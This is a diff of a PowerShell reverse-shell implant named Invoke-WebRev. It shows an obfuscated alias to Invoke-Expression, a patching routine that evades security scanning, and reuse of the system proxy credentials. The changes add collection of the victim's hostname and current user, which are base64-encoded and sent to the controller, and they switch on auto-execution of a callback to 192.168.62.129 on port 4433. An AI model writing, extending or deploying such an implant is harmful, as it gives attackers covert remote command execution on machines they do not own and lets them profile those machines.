@@ -34,7 +34,11 @@ function Invoke-WebRev{
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
     Invoke-PatchMe;
     $pwd_b64 = getPwd;
-    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '"}';
+    $hname = toBase64 -str "$env:computername";
+    $cuser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
+    $cuser = toBase64 -str $cuser;
+
+    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
     
     [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
     [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
@@ -140,13 +144,22 @@ function Invoke-WebRev{
 
                     $bytes = $enc.GetBytes($err);
                     $result = [Convert]::ToBase64String($bytes);
-                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
+                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
                 } catch {}
             }
         };
     };
 }
 
+function toBase64
+{
+    Param([String] $str)
+
+    $enc = [system.Text.Encoding]::UTF8;
+    $bytes = $enc.GetBytes($str);
+    $result = [Convert]::ToBase64String($bytes);
+    return $result;
+}
 
 function getPwd()
 {
@@ -167,4 +180,4 @@ function Invoke-PatchMe
     taleska-ei-vrixeka $base64string | Out-Null;
 }
 
-#Invoke-WebRev -ip 192.168.62.129 -port 80
+Invoke-WebRev -ip 192.168.62.129 -port 4433
